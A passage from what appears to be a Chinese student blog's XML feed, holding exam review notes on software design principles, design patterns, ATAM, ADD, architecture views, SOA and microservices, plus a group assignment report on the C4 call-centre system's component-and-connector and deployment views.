<p>另一方面，具有高可维护性的软件系统也可能具有较高的可测试性，因为在设计和实现过程中，高可维护性通常需要考虑代码的可读性、可理解性和可维护性，从而使得代码更加规范和易于维护，而这些代码规范和标准也使得代码更加具有可测试性，因为可测试性通常需要代码的可读性和可理解性。</p>
]]></content>
      <categories>
        <category>软件系统设计</category>
      </categories>
      <tags>
        <tag>软件系统设计</tag>
      </tags>
  </entry>
  <entry>
    <title>软件系统设计2023 期末复习</title>
    <url>/2024/12/15/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1-%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<h3 id="设计原则"><a href="#设计原则" class="headerlink" title="设计原则"></a>设计原则</h3><ol>
<li>单一职责原则：一个对象应该只包含单一的职责，并且该职责被完整地封装在一个类中；或就一个类而言，应该仅有一个引起他变化的原因。是实现高内聚、低耦合的指导方针 。</li>
<li>开闭原则：一个软件实体应当对扩展开放，对修改关闭。</li>
<li>里氏替换原则：软件中如果能够使用基类对象，那么一定能够使用其子类对象。</li>
<li>依赖倒转原则：高层模块不应该依赖低层模块，它们都应该依赖抽象。抽象不应该 依赖于细节，细节应该依赖于抽象；或针对接口或抽象类编程，而不是针对实现或具体类编程。</li>
<li>接口隔离原则：客户端不应该依赖那些它不需要的接口。一旦一个接口太大，则需要将它分割成一些更细小的接口， 使用该接口的客户端仅需知道与之相关的方法即可。</li>
<li>合成复用原则：要尽量使用组合&#x2F;聚合关系，少用继承。</li>
<li>迪米特法则&#x2F;最小知识原则：每一个软件单位对其他的单位都只有最少的知识，而 且局限于那些与本单位密切相关的软件单位；一个软件实体应当 尽可能少的与其他实体发生相互作用。</li>
</ol>
<span id="more"></span>

<h3 id="策略模式"><a href="#策略模式" class="headerlink" title="策略模式"></a>策略模式</h3><h3 id="工厂方法模式"><a href="#工厂方法模式" class="headerlink" title="工厂方法模式"></a>工厂方法模式</h3><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20230613134245193.png" alt="image-20230613134245193" style="zoom: 50%;" />

<p>​	当系统扩展需要添加新的产品对象时，仅仅需要添加一个具体产品对象以及一个具体工厂对象，原有工厂对象不需要进行任何修改，也不需要修改客户端，很好地符合了“开闭原则”。</p>
<h3 id="抽象工厂模式"><a href="#抽象工厂模式" class="headerlink" title="抽象工厂模式"></a>抽象工厂模式</h3><p>产品等级结构：抽象电视机-具体电视机属于一个产品等级结构；抽象冰箱-具体冰箱属于另一个产品等级结构</p>
<p>产品族：海尔电视机-海尔冰箱-海尔空调属于一个产品族</p>
<p>抽象工厂模式与工厂方法模式最大的区别在于，工厂方法模 式针对的是一个产品等级结构，而抽象工厂模式则需要面对多 个产品等级结构。</p>
<p>开闭原则的倾斜性：增加新的工厂和产品族容易， 增加新的产品等级结构麻烦</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20230613135326968.png" alt="image-20230613135326968" style="zoom:50%;" />

<h3 id="状态模式"><a href="#状态模式" class="headerlink" title="状态模式"></a>状态模式</h3><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20230613140303006.png" alt="image-20230613140303006" style="zoom:50%;" />

<p>状态模式对“开闭原则”的支持并不太好，对于可以切换状 态的状态模式，增加新的状态类需要修改那些负责状态转换 的源代码，否则无法切换到新增状态；而且修改某个状态类的行为也需修改对应类的源代码。</p>
<h3 id="命令模式"><a href="#命令模式" class="headerlink" title="命令模式"></a>命令模式</h3><p>命令模式可以对发送者和接收者完全解耦，发送者与接收者之间没有直接引用关系，发送请求的对象只需要知道如何发送请求，而不必知道如何完成请求。这就是命令模式的模式动机。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20230613140638866.png" alt="image-20230613140638866" style="zoom: 50%;" />

<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20230613140752866.png" alt="image-20230613140752866" style="zoom:50%;" />

<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20230613141152027.png" alt="image-20230613141152027" style="zoom:50%;" />

<h3 id="观察者模式-发布订阅模式-模型视图模式"><a href="#观察者模式-发布订阅模式-模型视图模式" class="headerlink" title="观察者模式&#x2F;发布订阅模式&#x2F;模型视图模式"></a>观察者模式&#x2F;发布订阅模式&#x2F;模型视图模式</h3><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20230613141748317.png" alt="image-20230613141748317" style="zoom:50%;" />

<h3 id="中介者模式"><a href="#中介者模式" class="headerlink" title="中介者模式"></a>中介者模式</h3><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20230613145233659.png" alt="image-20230613145233659" style="zoom:50%;" />

<h3 id="模板方法模式"><a href="#模板方法模式" class="headerlink" title="模板方法模式"></a>模板方法模式</h3><h3 id="适配器模式"><a href="#适配器模式" class="headerlink" title="适配器模式"></a>适配器模式</h3><p>适配器模式(Adapter Pattern) ：将一个接口转换成 客户希望的另一个接口，适配器模式使接口不兼容的 那些类可以一起工作，其别名为包装器(Wrapper)。 适配器模式既可以作为类结构型模式，也可以作为对 象结构型模式。</p>
<h3 id="组合模式"><a href="#组合模式" class="headerlink" title="组合模式"></a>组合模式</h3><p>组合模式(Composite Pattern)：组合多个对象形成 树形结构以表示“整体-部分”的结构层次。组合模 式对单个对象（即叶子对象）和组合对象（即容器对 象）的使用具有一致性。 • 组合模式又可以称为“整体-部分”(Part-Whole)模 式，属于对象的结构模式，它将对象组织到树结构中， 可以用来描述整体与部分的关系。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20230613145805181.png" alt="image-20230613145805181" style="zoom:50%;" />

<h3 id="装饰模式"><a href="#装饰模式" class="headerlink" title="装饰模式"></a>装饰模式</h3><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20230613145907914.png" alt="image-20230613145907914" style="zoom:50%;" />

<p>与继承关系相比，关联关系的主要优势在于不会破坏类的封装性， 而且继承是一种耦合度较大的静态关系，无法在程序运行时动态扩 展。在软件开发阶段，关联关系虽然不会比继承关系减少编码量， 但是到了软件维护阶段，由于关联关系使系统具有较好的松耦合性， 因此使得系统更加容易维护。当然，关联关系的缺点是比继承关系 要创建更多的对象。 </p>
<p>使用装饰模式来实现扩展比继承更加灵活，它以对客户透明的方式 动态地给一个对象附加更多的责任。装饰模式可以在不需要创造更 多子类的情况下，将对象的功能加以扩展。</p>
<h3 id="外观模式"><a href="#外观模式" class="headerlink" title="外观模式"></a>外观模式</h3><p>引入外观角色之后，用户只需要直接与外观角色交互，用户与子系统 之间的复杂关系由外观角色来实现，从而降低了系统的耦合度。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20230613150031540.png" alt="image-20230613150031540" style="zoom:50%;" />

<p>根据“单一职责原则” ，在软件中将一个系统划分为若干个子系统 有利于降低整个系统的复杂性，一个常见的设计目标是使子系统间 的通信和相互依赖关系达到最小，而达到该目标的途径之一就是引 入一个外观对象，它为子系统的访问提供了一个简单而单一的入口。 </p>
<p>外观模式也是“迪米特法则”的体现，通过引入一个新的外观类可 以降低原有系统的复杂度，同时降低客户类与子系统类的耦合度。</p>
<p>在不引入抽象外观类的情况下，增加新的子系统可能需 要修改外观类或客户端的源代码，违背了“开闭原则”。</p>
<h3 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h3><p>通过引入一个新的对象（如小图片和远程代理对 象）来实现对真实对象的操作或者将新的对象作 为真实对象的一个替身，这种实现机制即为代理 模式，通过引入代理对象来间接访问一个对象， 这就是代理模式的模式动机</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20230613150215598.png" alt="image-20230613150215598" style="zoom:50%;" />

<h3 id="随便默默"><a href="#随便默默" class="headerlink" title="随便默默"></a>随便默默</h3><h5 id="软件架构文档包"><a href="#软件架构文档包" class="headerlink" title="软件架构文档包"></a>软件架构文档包</h5><ol>
<li><p>Beyond</p>
<p>a. 文档路线图：包含了范围、总结和简明摘要</p>
<p>b. 视图的文档组织方式：描述了文档内的视图是如何组织的</p>
<p>c. 系统概要：从整体上描述当前架构的简要介绍、业务驱动因素等</p>
<p>d. 不同视图的映射关系</p>
<p>e. 系统原理：从整体上描述当前架构的设计原理</p>
<p>f. 目录-索引、词汇表、首字母缩略表</p>
</li>
<li><p>View</p>
<p>a. 体系结构风格和视图</p>
<p>b. 结构视图，包含模块视图、组件和连接器视图、部署视图</p>
<p>c. 质量视图</p>
</li>
<li><p>在每个View内包含</p>
<p>a. 主视图：显示视图的元素和关系，以及图例</p>
<p>b. 元素列表：详细介绍a中的每个元素、元素属性、关系属性、元素接口以及行为</p>
<p>c. 上下文图：描述了系统如何与环境相关</p>
<p>d. 可变性指引：描述视图中可能变化的地方</p>
<p>e. 基本原理：描述设计是如何映射到视图中的，以及其合理性</p>
</li>
</ol>
<h5 id="ATAM中每个阶段的输出："><a href="#ATAM中每个阶段的输出：" class="headerlink" title="ATAM中每个阶段的输出："></a>ATAM中每个阶段的输出：</h5><ol>
<li><p>step-0 准备和建立团队</p>
<p>a. 评估计划</p>
</li>
<li><p>step-1 评估1</p>
<p>a. 架构的简明介绍</p>
<p>b. 业务目标（驱动因素）的阐释</p>
<p>c. 作为场景的特定质量属性所要求的优先级列表</p>
<p>d. 效用树</p>
<p>e. 风险点和无风险点</p>
<p>f. 敏感点和均衡点</p>
</li>
<li><p>step-2 评估-2</p>
<p>a. 涉众们的场景优先级列表</p>
<p>b. 风险主题和业务驱动因素各种受到的威胁</p>
</li>
<li><p>step-3 后续</p>
<p>a. 最终的评估报告</p>
</li>
</ol>
<h5 id="ATAM中每个阶段参与的stakeholders与其职责"><a href="#ATAM中每个阶段参与的stakeholders与其职责" class="headerlink" title="ATAM中每个阶段参与的stakeholders与其职责"></a>ATAM中每个阶段参与的stakeholders与其职责</h5><ol>
<li><p>step-0 准备和建立团队 </p>
<p>参与者：评估团队领导、关键项目决策者</p>
<p>职责：根据体系架构文档生成评估计划</p>
</li>
<li><p>step-1 评估1</p>
<p>参与者：评估团队、项目决策者</p>
<p>职责：</p>
<p>a. 评估负责人介绍ATAM方法</p>
<p>b. 项目经理或客户从业务角度介绍业务驱动因素</p>
<p>c. 首席架构师介绍体系结构</p>
<p>d. 评估团队确定架构方法</p>
<p>e. 评估团队和项目决策者生成质量属性效用树</p>
<p>f. 评估团队分析架构方法</p>
</li>
<li><p>step-2 评估2</p>
<p>参与者：评估团队、项目决策者 、项目涉众</p>
<p>职责：</p>
<p>a. 评估负责人再次介绍ATAM方法，并展示之前取得成果</p>
<p>b. 涉众头脑风暴确定场景优先级</p>
<p>c. 评估团队分析架构方法</p>
<p>e. 评估团队展示架构方法，并提交给涉众</p>
</li>
<li><p>step-3 后续</p>
<p>参与者：评估团队、主要涉众</p>
<p>职责：评估团队制作最终评估报告，并交给主要涉众审核后，递交给委托评估的人</p>
</li>
</ol>
<h5 id="软件架构过程中的一般活动，以及每个活动的输入、输出"><a href="#软件架构过程中的一般活动，以及每个活动的输入、输出" class="headerlink" title="软件架构过程中的一般活动，以及每个活动的输入、输出"></a>软件架构过程中的一般活动，以及每个活动的输入、输出</h5><ol>
<li><p>识别ASRS：</p>
<p>输入：涉众</p>
<p>输出：优先的质量属性场景</p>
</li>
<li><p>架构设计：</p>
<p>输入：优先的质量属性场景、需求和约束、策略和模式</p>
<p>输出：一组由模式决定的选场景的草图</p>
</li>
<li><p>架构文档化：</p>
<p>输入：一组由模式决定的选场景的草图、涉众</p>
<p>输出：view &amp; beyond</p>
</li>
<li><p>架构评估：</p>
<p>输入：view &amp; beyond、涉众、优先的质量属性场景</p>
<p>输出：view &amp; beyond</p>
</li>
</ol>
<h5 id="软件架构的来源"><a href="#软件架构的来源" class="headerlink" title="软件架构的来源"></a>软件架构的来源</h5><ol>
<li>非功能需求 NFRs</li>
<li>架构攸关需求 ASRs</li>
<li>质量属性</li>
<li>涉众和组织</li>
<li>技术环境</li>
<li>业务目标</li>
<li>商业与技术决策组合</li>
</ol>
<h5 id="有哪些通用设计策略（generic-design-strategies），给每个策略提供一个简明工作示例"><a href="#有哪些通用设计策略（generic-design-strategies），给每个策略提供一个简明工作示例" class="headerlink" title="有哪些通用设计策略（generic design strategies），给每个策略提供一个简明工作示例"></a>有哪些通用设计策略（generic design strategies），给每个策略提供一个简明工作示例</h5><ol>
<li>抽象：使用抽象让设计师关注本身结构而不关注实现，例如将系统抽象为组件-连接器</li>
<li>分解：针对某一系统关注点分解后处理，例如将整个系统或某个模块分解</li>
<li>分而治之：将每个模块分别处理</li>
<li>生成与测试：将一个特定的设计看作是一个假设；根据测试路径生成测试</li>
<li>迭代与细化：使用迭代的方法，例如ADD方法多次迭代直至满足所有ASR</li>
<li>复用元素：重用在设计过程中出现了可以复用的元素，例如重用现有架构</li>
</ol>
<h5 id="什么是ASR，列举提取和识别ASR的四种来源和方法"><a href="#什么是ASR，列举提取和识别ASR的四种来源和方法" class="headerlink" title="什么是ASR，列举提取和识别ASR的四种来源和方法"></a>什么是ASR，列举提取和识别ASR的四种来源和方法</h5><p>ASRs 架构攸关需求是对体系结构产生了深远影响的需求</p>
<p>四种来源和方法：</p>
<ol>
<li>从需求文档获取ASRs：MoScoW方法，用户故事</li>
<li>从采访涉众获取ASRs：软件质量工作坊</li>
<li>从业务目标获取ASRs：</li>
<li>用质量属性效用树管理ASRs：</li>
</ol>
<h5 id="ADD过程"><a href="#ADD过程" class="headerlink" title="ADD过程"></a>ADD过程</h5><ol>
<li>确定由足够的需求信息</li>
<li>选择要分解的系统要素</li>
<li>确定选择的要素的ASR</li>
<li>选择符合ASR的设计<ol>
<li>找出设计问题</li>
<li>列出子关注点替代模式&#x2F;决策</li>
<li>从清单中选择模式&#x2F;决策</li>
<li>确定模式&#x2F;决策与ASR之间的关系</li>
<li>记录初步的架构视图</li>
<li>评估并解决不一致问题</li>
</ol>
</li>
<li>实例化架构元素并分配职责</li>
<li>实例化元素定义接口</li>
<li>验证和完善需求</li>
<li>重复2-7步直到满足所有的ASR</li>
</ol>
<h5 id="风险点、权衡点、敏感点"><a href="#风险点、权衡点、敏感点" class="headerlink" title="风险点、权衡点、敏感点"></a>风险点、权衡点、敏感点</h5><ol>
<li>识别风险：发现对所需的质量属性有负面影响的架构决策，例如使用分层模式会导致性能损耗</li>
<li>发现权衡：发现对多个质量属性有影响的架构决策，例如使用分层模式会损耗性能，但也会解耦增加系统的可修改性</li>
<li>发现敏感：发现特定质量属性对其敏感的架构决策， 例如对性能敏感的系统，使用缓存中间件</li>
</ol>
<h5 id="设计、体系结构（架构）、结构的关系"><a href="#设计、体系结构（架构）、结构的关系" class="headerlink" title="设计、体系结构（架构）、结构的关系"></a>设计、体系结构（架构）、结构的关系</h5><ol>
<li><p>设计包含架构，架构包含结构</p>
</li>
<li><p>结构是静态的、逻辑的，是关于系统如何组成的</p>
</li>
<li><p>架构除了包含结构，还包含了组件之间的相关的关系结构，并定义一些动态的行为</p>
</li>
<li><p>架构是关于软件设计的，所有架构都是软件设计，但不是所有的设计都是架构，架构是软件设计的一部分</p>
</li>
</ol>
<h5 id="为什么使用不同视图，给出4种视图"><a href="#为什么使用不同视图，给出4种视图" class="headerlink" title="为什么使用不同视图，给出4种视图"></a>为什么使用不同视图，给出4种视图</h5><p>原因：</p>
<ol>
<li>不同视图支持不同的目标和用户，突出不同的系统元素和关系</li>
<li>不同视图将不同的系统元素暴露出不同的程度</li>
</ol>
<p>视图：</p>
<ol>
<li>模块视图：提供一组连贯职责的实现单元</li>
<li>组件连接器视图：显示具有某些运行时存在的元素</li>
<li>部署视图：反映了软件单元到软件开发或运行环境元素的映射</li>
<li>质量视图：安全视图、性能视图、可靠性视图、沟通视图、异常视图</li>
<li>组合视图</li>
</ol>
<h5 id="描述4-1视图"><a href="#描述4-1视图" class="headerlink" title="描述4+1视图"></a>描述4+1视图</h5><ol>
<li>逻辑视图：描述架构中的重要元素和关系</li>
<li>过程视图：描述元素的并发和交互</li>
<li>物理视图：描述主要过程和组件如何映射到硬件上</li>
<li>发展视图：描述软件组件的内部组织联系</li>
<li>用例场景：捕获架构需求，与一个或多个视图有关</li>
</ol>
<h5 id="SOA："><a href="#SOA：" class="headerlink" title="SOA："></a>SOA：</h5><p>核心：</p>
<ol>
<li>服务契约</li>
<li>服务封装</li>
<li>服务重用</li>
<li>服务组合</li>
<li>服务自治</li>
<li>服务无状态</li>
</ol>
<p>对互操作性：支持服务自动识别、注册、调用</p>
<p>对可伸缩性：服务高内聚，松耦合，易于可伸缩</p>
<p>对安全性：中间件可能被攻击；多服务导致追踪溯源困难</p>
<h5 id="微服务"><a href="#微服务" class="headerlink" title="微服务"></a>微服务</h5><p>在SOA基础上</p>
<ol>
<li>取消ESB，改用轻量级通信协议</li>
<li>部署和管理结合devops实现自动化</li>
<li>增加API网关</li>
<li>增加熔断器</li>
</ol>
]]></content>
      <categories>
        <category>软件系统设计</category>
      </categories>
      <tags>
        <tag>期末复习</tag>
        <tag>软件系统设计</tag>
      </tags>
  </entry>
  <entry>
    <title>软件系统设计-作业3</title>
    <url>/2024/12/15/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1-%E4%BD%9C%E4%B8%9A3/</url>
    <content><![CDATA[<h3 id="作业要求"><a href="#作业要求" class="headerlink" title="作业要求"></a>作业要求</h3><p><a href="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/pdf/assignment-3.pdf">https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/pdf/assignment-3.pdf</a></p>
<p><a href="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/pdf/assignment-3-reading-c4.pdf">https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/pdf/assignment-3-reading-c4.pdf</a></p>
<p>你需要负责为以下系统设计一个软件体系结构。你应该使用属性驱动设计（Attribute Driven Design，ADD）方法，并以多个视图来记录最终的体系结构。在这个作业中，三到四名学生需要组成一个小组共同完成作业。每个学生在这个作业上的得分将根据小组的表现来确定，包括个人对工作的贡献和反思。</p>
<p>本作业的补充阅读材料是“呼叫中心客户服务（C4）案例研究”，该案例介绍了一个大型电信公司使用的系统的初始（“一级”）架构分解。该系统包括五个主要子系统，如阅读材料中所述。一级架构在阅读材料中的图1中显示。</p>
<span id="more"></span>

<h5 id="作业提交要求"><a href="#作业提交要求" class="headerlink" title="作业提交要求"></a><strong>作业提交要求</strong></h5><p>每个小组应提交一个<strong>单独的PDF文件</strong>。你的报告应该是<strong>不超过20页</strong>（A4大小）的，并包括以下内容： </p>
<ul>
<li><p>关于你如何遵循属性驱动设计方法的报告（20分）。在设计体系结构时，你需要进行至少<strong>两次迭代</strong>（每次迭代10分）。这部分包括两个组成部分：</p>
<ul>
<li>一个以场景形式提出的重要非功能性需求（和约束）的列表，这些需求是你已经识别或假设的。</li>
<li>你在执行ADD方法的第3步（选择一个ASR）和第4.2&#x2F;4.3步（选择体系结构模式&#x2F;策略）时选择的所有具有架构重要性的需求（ASRs）、设计关注点和架构模式&#x2F;策略的列表。这应该包括所有可能没有包含在最终体系结构中的中间候选方案。应提供对选择的简要解释。</li>
</ul>
</li>
<li><p>最终的软件体系结构文档（15分）：</p>
<ul>
<li>使用第18章的模板提供的视图（模型）和交叉视图。至少应有<strong>三个视图</strong>（其中至少一个是模块视图）以及一个交叉视图。不能省略“基本原理”部分。有关更多信息，请参阅[2]。</li>
<li>鼓励使用适合的UML图。请参考[3]。有关UML的更多信息，请参阅[4]。然而，你也可以选择使用其他你感到更舒适的替代建模语言符号。</li>
</ul>
</li>
<li><p>每个小组的每个学生都应提供完整的个人评语（每人大约半页）（5分），包括以下两个组成部分：</p>
<ul>
<li>关于使用ADD方法的个人经验的描述。</li>
<li>对你在小组工作和报告中的贡献的总结。</li>
</ul>
</li>
</ul>
<h5 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h5><ol>
<li>你可以使用中文或英文编写和提交报告。使用英文时，你不需要完全正确。然而，你应确保以清晰易懂的方式传达所有内容。</li>
<li>当你需要更多信息来做出设计决策时，你应该做出假设，并记录下来，然后再做出设计决策。</li>
<li>这个作业没有最小长度要求，但不应超过20页。请简明扼要地陈述观点。</li>
<li>你将根据你应用设计方法和文档设计的能力而不是设计的绝对正确性来评估。</li>
</ol>
<h3 id="交叉图"><a href="#交叉图" class="headerlink" title="交叉图"></a>交叉图</h3><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/交叉图.png" alt="交叉图" style="zoom: 33%;" />

<h3 id="组件和连接器视图（Component-and-Connector-View）"><a href="#组件和连接器视图（Component-and-Connector-View）" class="headerlink" title="组件和连接器视图（Component-and-Connector View）"></a>组件和连接器视图（Component-and-Connector View）</h3><h4 id="主表视图"><a href="#主表视图" class="headerlink" title="主表视图"></a>主表视图</h4><p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/%E7%BB%84%E4%BB%B6%E5%92%8C%E8%BF%9E%E6%8E%A5%E5%99%A8%E8%A7%86%E5%9B%BE1.png" alt="组件和连接器视图1"></p>
<h4 id="元素目录"><a href="#元素目录" class="headerlink" title="元素目录"></a>元素目录</h4><table>
<thead>
<tr>
<th>元素名</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>User Interface</td>
<td>用户使用系统服务的接口，包括直接对话、自主呼叫，以及未来自助服务台和客户端中的用户界面</td>
</tr>
<tr>
<td>Agent Client Interface</td>
<td>代理客户端接口，公司业务熟悉人员与系统服务交互的界面</td>
</tr>
<tr>
<td>Gateway Service</td>
<td>负责用户的登录授权，保证用户与系统交互的安全性</td>
</tr>
<tr>
<td>TP Monitor</td>
<td>对事务处理进行监视，负责事务分配</td>
</tr>
<tr>
<td>C4 Business Service</td>
<td>C4业务服务，处理服务协商、账户管理、故障呼叫管理等业务</td>
</tr>
<tr>
<td>Message-oriented Middleware</td>
<td>面向消息的中间件，提供对C4与NOSS之间信息交换的支持</td>
</tr>
<tr>
<td>NOSS Service</td>
<td>提供对网络运行的支持服务</td>
</tr>
<tr>
<td>Publish&#x2F;Subcribe Message Broker</td>
<td>发布订阅消息代理，负责发布订阅模式中消息的接收与转发</td>
</tr>
<tr>
<td>Downstream Systems</td>
<td>下游系统，诸如长途运营商服务、911服务、语音邮件、电话簿接口和收入收取（信用评分和检查）等</td>
</tr>
<tr>
<td>Security Service</td>
<td>安全服务，提供对系统与外界交互的安全性保障</td>
</tr>
<tr>
<td>On-line Enterprise DB</td>
<td>在线企业数据库</td>
</tr>
<tr>
<td>Batch Billing DB</td>
<td>批计费数据库，是On-line Enterprise DB的批处理副本</td>
</tr>
<tr>
<td>Billing Service</td>
<td>计费服务，负责计算、打印发票和账单查询、调整等服务</td>
</tr>
</tbody></table>
<h4 id="上下文图"><a href="#上下文图" class="headerlink" title="上下文图"></a>上下文图</h4><p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/%E7%BB%84%E4%BB%B6%E5%92%8C%E8%BF%9E%E6%8E%A5%E5%99%A8%E8%A7%86%E5%9B%BE2.png" alt="组件和连接器视图2"></p>
<h4 id="可变性指引"><a href="#可变性指引" class="headerlink" title="可变性指引"></a>可变性指引</h4><p>目前用户接口主要有与公司代表的直接对话和自主呼叫服务，这些都需要手工登入到系统的代理客户端接口，未来加入自助服务台和互联网服务后，需要增加基于TCP&#x2F;IP的通信方式。C4业务服务与NOSS的通信是依赖是一组以“named-tag&#x2F;value”形式的的消息接口，具体的消息交互方式和数据格式都可能会发生改变。</p>
<h4 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h4><p>用户和业务人员的所有请求都要经过GateWay Service的检验，以提供用户与系统交互的安全性。系统与外界的交互通过Security Service的安全校验。C4业务服务不直接与计费服务交互，而是C4与公司的在线数据库交互，计费服务与批处理数据库交互，其中批处理数据库是在线数据库的副本，以此保证两者数据之间的解耦。</p>
<h3 id="分配部署视图（Allocation-View）"><a href="#分配部署视图（Allocation-View）" class="headerlink" title="分配部署视图（Allocation View）"></a>分配部署视图（Allocation View）</h3><h4 id="主表示图"><a href="#主表示图" class="headerlink" title="主表示图"></a>主表示图</h4><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/部署视图1.png" alt="部署视图1" style="zoom: 33%;" />

<h4 id="元素目录-1"><a href="#元素目录-1" class="headerlink" title="元素目录"></a>元素目录</h4><table>
<thead>
<tr>
<th>元素名</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>Agent Client</td>
<td>部署代理客户端，公司业务熟悉人员与系统服务交互的接口</td>
</tr>
<tr>
<td>Gateway Service</td>
<td>部署网关服务，外界请求需要经过网关进入企业局域网</td>
</tr>
<tr>
<td>TP Monitor Service</td>
<td>部署事务处理监视服务，负责服务器的负载均衡</td>
</tr>
<tr>
<td>C4 Business Service</td>
<td>部署C4业务服务，处理服务协商、账户管理、故障呼叫管理等业务</td>
</tr>
<tr>
<td>Network Operations Support Service</td>
<td>部署网络运行支持服务，负责网络创建、网络管理、网络配置等业务</td>
</tr>
<tr>
<td>Publish&#x2F;Subscribe Message Broker Service</td>
<td>部署发布订阅消息代理服务，负责发布订阅模式中消息的接收与转发</td>
</tr>
<tr>
<td>Downstream Systems Service</td>
<td>部署下游系统服务，负责处理下游系统有关的事物</td>
</tr>
<tr>
<td>On-line Enterprice DataBase</td>
<td>部署在线企业数据库，存储C4业务所需和产生的数据</td>
</tr>
<tr>
<td>Batch Billing Database</td>
<td>部署批计费数据库，是在线数据库的批处理副本，存储计费业务所需的数据</td>
</tr>
<tr>
<td>Billing Service</td>
<td>部署计费服务，负责计算、打印发票和账单查询、调整等服务</td>
</tr>
<tr>
<td>Security Service</td>
<td>部署安全服务，负责系统与外界交互的安全性</td>
</tr>
</tbody></table>
<h4 id="上下文图-1"><a href="#上下文图-1" class="headerlink" title="上下文图"></a>上下文图</h4><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/部署视图2.png" alt="部署视图2" style="zoom:33%;" />

<h4 id="可变性指引-1"><a href="#可变性指引-1" class="headerlink" title="可变性指引"></a>可变性指引</h4><p>C4业务服务目前部署在一组运行UNIX操作系统的HP9000服务器上，未来可能会增加或改为使用其他新型号的服务器，或是选用分布式云服务。在线数据库和批数据库在未来随着系统的发展与扩张可能需要进行升级，以适应更大的数据量和更频繁的访问。</p>
<h4 id="基本原理-1"><a href="#基本原理-1" class="headerlink" title="基本原理"></a>基本原理</h4><p>部署视图结合 ADD 方法中迭代一和迭代二的分析，描述了各个服务模块的实际部署与在部署中的关联，将整个大系统部署到各个对应的服务器上，是构建与连接件对硬件的映射。</p>
<h3 id="团队中的个人工作"><a href="#团队中的个人工作" class="headerlink" title="团队中的个人工作"></a>团队中的个人工作</h3><p> 在本次软件系统设计作业中，我承担了最终软件架构文档中组件和连接器视图（Component-and-Connector View）和分配部署视图（Allocation View）的编写任务。此外，我还与团队成员一起参与了对C4系统资料的讨论与分析，从中提取出关键的功能需求、质量属性和约束。</p>
<p>在这次作业中，我收获了许多，我学习了ADD（Attribute-Driven Design）方法，并对其有了一定的认识和掌握，并深刻认识到它在软件架构设计中的重要性。ADD方法是一个系统化的架构设计过程，注重需求驱动和质量属性的关注。在这个过程中，我学会了如何识别并提炼出架构中的重要要素，特别是对系统的架构决策具有重要指导作用的ASRs，这些ASRs是设计过程中需要特别关注和解决的关键需求。</p>
<p>在本次作业中，我也学习并实践了如何画出清晰和有效的架构图。 例如在绘制分配部署视图（Allocation View）的过程中，我学会了如何描述系统的部署和分配情况，如何将组件和资源之间的关系呈现出来，以及描述它们在物理环境中的布局和配置。</p>
<p>总之，在这次大作业的过程中，我学习到了软件系统设计的方法和流程，特别是对ADD方法的学习，以及如何绘制出软件系统中的各个视图，真的受益良多。</p>
]]></content>
      <categories>
        <category>软件系统设计</category>
      </categories>
      <tags>
        <tag>软件系统设计</tag>
      </tags>
  </entry>
  <entry>
    <title>软件系统设计-作业2</title>
    <url>/2024/12/15/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1-%E4%BD%9C%E4%B8%9A2/</url>
    <content><![CDATA[<h3 id="作业要求"><a href="#作业要求" class="headerlink" title="作业要求"></a>作业要求</h3><p><a href="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/pdf/assignment-2.pdf">https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/pdf/assignment-2.pdf</a></p>
<h3 id="Task-1-Architecture-Pattern-Analysis"><a href="#Task-1-Architecture-Pattern-Analysis" class="headerlink" title="Task 1: Architecture Pattern Analysis"></a><strong>Task 1: Architecture Pattern Analysis</strong></h3><h4 id="一-Broker-Pattern（代理模式）"><a href="#一-Broker-Pattern（代理模式）" class="headerlink" title="一 Broker Pattern（代理模式）"></a><strong>一 Broker Pattern（代理模式）</strong></h4><p><strong>1.</strong>  <strong>Availability</strong> <strong>可用性</strong></p>
<p>通过将请求路由到多个服务器和服务实例，可以避免单个服务器或服务实例出现故障而导致整个系统不可用的情况。当一个服务器或服务实例不可用时，broker可以将请求转发到其他可用的服务器或服务实例上，从而实现系统的高可用性。</p>
<p>但另一方面，一个broker可能会服务于大量的客户端与服务端，这种情况下broker本身容易出现故障，整个系统也会受到影响。</p>
